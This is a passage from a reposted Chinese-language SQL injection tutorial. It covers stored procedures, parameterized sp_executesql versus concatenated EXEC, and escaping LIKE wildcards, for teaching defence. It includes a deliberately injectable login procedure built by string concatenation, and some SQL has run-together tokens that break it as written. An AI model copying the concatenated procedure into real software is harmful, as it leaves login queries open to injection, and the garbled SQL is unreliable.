安全性高，防止SQL注入並且可設定只有某些用戶才能使用指定存儲過程。</p><p class=ql-align-justify>b) 在創建時進行預編譯，後續的調用不需再重新編譯。</p><p class=ql-align-justify>c) 可以降低網絡的通信量。存儲過程方案中用傳遞存儲過程名來代替SQL語句。</p><p class=ql-align-justify>缺點：</p><p class=ql-align-justify>a) 非應用程序內聯代碼，調式麻煩。</p><p class=ql-align-justify>b) 修改麻煩，因為要不斷的切換開發工具。（不過也有好的一面，一些易變動的規則做到存儲過程中，如變動就不需要重新編譯應用程序）</p><p class=ql-align-justify>c) 如果在一個程序系統中大量的使用存儲過程，到程序交付使用的時候隨著用戶需求的增加會導致數據結構的變化，接著就是系統的相關問題了，最後如果用戶想維護該系統可以說是很難很難（eg：沒有VS的查詢功能）。</p><p class=ql-align-justify>關鍵代碼為：</p><blockquote><p>cmd.CommandText = procName; // 傳遞存儲過程名cmd.CommandType = CommandType.StoredProcedure; // 標識解析為存儲過程</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>如果在存儲過程中SQL語法很複雜需要根據邏輯進行拼接，這時是否還具有放注入的功能？</p><p class=ql-align-justify>答：MSSQL中可以通過 EXEC 和sp_executesql動態執行拼接的sql語句，但sp_executesql支持替換 Transact-SQL 字符串中指定的任何參數值， EXECUTE 語句不支持。所以只有使用sp_executesql方式才能啟到參數化防止SQL注入。</p><p class=ql-align-justify>關鍵代碼：</p><p class=ql-align-justify>a) sp_executesql</p><blockquote><p><strong>CREATE</strong> <strong>PROCEDURE</strong> PROC_Login_executesql(@userNamenvarchar(10),@<strong>password</strong> nvarchar(10),@count <strong>int</strong> OUTPUT)<strong>ASBEGIN</strong> <strong>DECLARE</strong> s nvarchar(1000);<strong>set</strong> @s=N'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password'; EXEC sp_executesql @s,N'@userName nvarchar(10),@password nvarchar(10),@count int output',@userName=@userName,@<strong>password</strong>=@<strong>password</strong>,@count=@count output<strong>END</strong></p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>b) EXECUTE（注意sql中拼接字符，對於字符參數需要額外包一層單引號，需要輸入兩個單引號來標識sql中的一個單引號）</p><blockquote><p><strong>CREATE</strong> <strong>PROCEDURE</strong> PROC_Login_EXEC(@userNamenvarchar(10),@<strong>password</strong> <strong>varchar</strong>(20))<strong>ASBEGIN</strong> <strong>DECLARE</strong> s nvarchar(1000);<strong>set</strong> @s='SELECT @count=COUNT(*) FROM Login WHERE UserName='''+CAST(@userName <strong>AS</strong> NVARCHAR(10))+''' AND Password='''+CAST(@<strong>password</strong> <strong>AS</strong> <strong>VARCHAR</strong>(20))+'''';EXEC('DECLARE @count int;' +@s+'select @count');<strong>END</strong></p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>注入截圖如下：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/03d489ae0c744c2193a61df29646c1b1><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><h1 class=ql-align-justify><br></h1><h1 class=ql-align-justify><strong>6. 專業的SQL注入工具及防毒軟件</strong></h1><p class=ql-align-justify><br></p><p class=ql-align-justify>情景1</p><p class=ql-align-justify>A：“丫的，又中毒了……”</p><p class=ql-align-justify>B：“我看看，你這不是裸機在跑嗎？”</p><p class=ql-align-justify>電腦上至少也要裝一款殺毒軟件或木馬掃描軟件，這樣可以避免一些常見的侵入。比如開篇提到的SQL創建windows帳戶，就會立馬報出警報。</p><p class=ql-align-justify>情景2</p><p class=ql-align-justify>A：“終於把網站做好了，太完美了，已經檢查過沒有漏洞了！”</p><p class=ql-align-justify>A：“網站怎麼被黑了，怎麼入侵的？？？”</p><p class=ql-align-justify>公司或個人有財力的話還是有必要購買一款專業SQL注入工具來驗證下自己的網站，這些工具畢竟是專業的安全人員研發，在安全領域都有自己的獨到之處。</p><h1 class=ql-align-justify><strong>7. 額外小知識：LIKE中的通配符</strong></h1><p class=ql-align-justify><br></p><p class=ql-align-justify>儘管這個不屬於SQL注入，但是其被惡意使用的方式是和SQL注入類似的。</p><p>%包含零個或多個字符的任意字符串。_任何單個字符。[]指定範圍（例如 [a-f]）或集合（例如 [abcdef]）內的任何單個字符。[^]不在指定範圍（例如 [^a – f]）或集合（例如 [^abcdef]）內的任何單個字符。</p><p class=ql-align-justify><br></p><p class=ql-align-justify>在模糊查詢LIKE中，對於輸入數據中的通配符必須轉義，否則會造成客戶想查詢包含這些特殊字符的數據時，這些特殊字符卻被解析為通配符。不與 LIKE 一同使用的通配符將解釋為常量而非模式。</p><p class=ql-align-justify>注意使用通配符的索引性能問題：</p><p class=ql-align-justify>a) like的第一個字符是‘%’或‘_’時，為未知字符不會使用索引, sql會遍歷全表。</p><p class=ql-align-justify>b) 若通配符放在已知字符後面，會使用索引。</p><p class=ql-align-justify>網上有這樣的說法，不過我在MSSQL中使用 ctrl+L 執行語法查看索引使用情況卻都沒有使用索引，可能在別的數據庫中會使用到索引吧……</p><p class=ql-align-justify>截圖如下：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/de5e43fdb5ba4d22812321831a197a1a><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><p class=ql-align-justify>有兩種將通配符轉義為普通字符的方法：</p><p class=ql-align-justify>1) 使用ESCAPE關鍵字定義轉義符（通用）</p><p class=ql-align-justify>在模式中，當轉義符置於通配符之前時，該通配符就解釋為普通字符。例如，要搜索在任意位置包含字符串 5% 的字符串，請使用：</p><p class=ql-align-justify>WHERE ColumnA LIKE ‘%5/%%’ ESCAPE ‘/’</p><p class=ql-align-justify>2) 在方括號 ([ ]) 中只包含通配符本身，或要搜索破折號(-) 而不是用它指定搜索範圍，請將破折號指定為方括號內的第一個字符。EG：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/b92439c0d4984079a7dcea4ab92cd03f><p class=pgc-img-caption></p></div><p class=ql-align-justify>所以，進行過輸入參數的關鍵字過濾後，還需要做下面轉換確保LIKE的正確執行</p></div></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>SQL</a></li><li><a>入門</a></li><li><a>詳解</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/da68e48.html alt=SQL注入詳解，看這篇就夠了 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/ef182f592d4f4940873e8c891ab236de style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/da68e48.html title=SQL注入詳解，看這篇就夠了>SQL注入詳解，看這篇就夠了</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/f19faca.html alt=這可能是SQL注入入門最好的文章了（持續跟新） class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/6e88e78b642f488dae03845b1e8f71b6 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/f19faca.html title=這可能是SQL注入入門最好的文章了（持續跟新）>這可能是SQL注入入門最好的文章了（持續跟新）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/f8b2a960.html alt="思路方法詳解 高三數學複習難點突破 圓錐曲線中的定點、定值問題" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/afd28158b4384f5eaa05c44c3104e24f style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/f8b2a960.html title="思路方法詳解 高三數學複習難點突破 圓錐曲線中的定點、定值問題">思路方法詳解 高三數學複習難點突破 圓錐曲線中的定點、定值問題</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/6fe27eab.html alt="前端 | HTML入門基礎知識-網頁" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/e7a0b61194f445b8b9e5ae330961d2ea style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/6fe27eab.html title="前端 | HTML入門基礎知識-網頁">前端 | HTML入門基礎知識-網頁</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/17054f8d.html alt=詳解CD編碼格式（16bit/44.1kHz）合理性之量化篇 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/6f23d12bac3843e2b09628221846ce0f style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/17054f8d.html title=詳解CD編碼格式（16bit/44.1kHz）合理性之量化篇>詳解CD編碼格式（16bit/44.1kHz）合理性之量化篇</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c84544ec.html alt=詳解CD編碼格式（16bit/44.1kHz）合理性之採樣篇 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/5dc880024dac477f8aed432054712f82 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/c84544ec.html title=詳解CD編碼格式（16bit/44.1kHz）合理性之採樣篇>詳解CD編碼格式（16bit/44.1kHz）合理性之採樣篇</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/feaa3a52.html alt=詳解音頻編解碼的原理、演進和應用選型等 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/c0abba2ccef04296b442c6457cc98f49 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/feaa3a52.html title=詳解音頻編解碼的原理、演進和應用選型等>詳解音頻編解碼的原理、演進和應用選型等</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8293e598.html alt=MySQl事務最全詳解 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/c61163c863114226b14bb3760da19e4d style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8293e598.html title=MySQl事務最全詳解>MySQl事務最全詳解</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/cb944fe7.html alt=Mysql事務詳解(一文讀懂數據庫事務) class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/cb7ba6cbda8c44438d9d3d7c57bd25b9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/cb944fe7.html title=Mysql事務詳解(一文讀懂數據庫事務)>Mysql事務詳解(一文讀懂數據庫事務)</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/125dee29.html alt="SQL Server中的事務與鎖" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/1533794121802a9afbb22f9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/125dee29.html title="SQL Server中的事務與鎖">SQL Server中的事務與鎖</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e9d6f488.html alt="SQL Server中的事務（附有實例）" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/21e047bd6e3c41fba0beac7ef3f1ce4e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e9d6f488.html title="SQL Server中的事務（附有實例）">SQL Server中的事務（附有實例）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/bb071e7e.html alt="SQL 事務機制-transaction" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/3231427d97bf4a04b148360fea032241 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/bb071e7e.html title="SQL 事務機制-transaction">SQL 事務機制-transaction</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c6e14bc6.html alt=SQL基礎知識——事務 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/773e21df09dc4e3e8403a0a62994039d style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/c6e14bc6.html title=SQL基礎知識——事務>SQL基礎知識——事務</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/dc1a27dd.html alt="詳解Oracle 數據庫啟動過程" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/1538236609349861be8e044 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/dc1a27dd.html title="詳解Oracle 數據庫啟動過程">詳解Oracle 數據庫啟動過程</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b8bda645.html alt=「Java」隨機數詳解 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/b471807e699b44c2b1dedc580ea3f3af style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b8bda645.html title=「Java」隨機數詳解>「Java」隨機數詳解</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>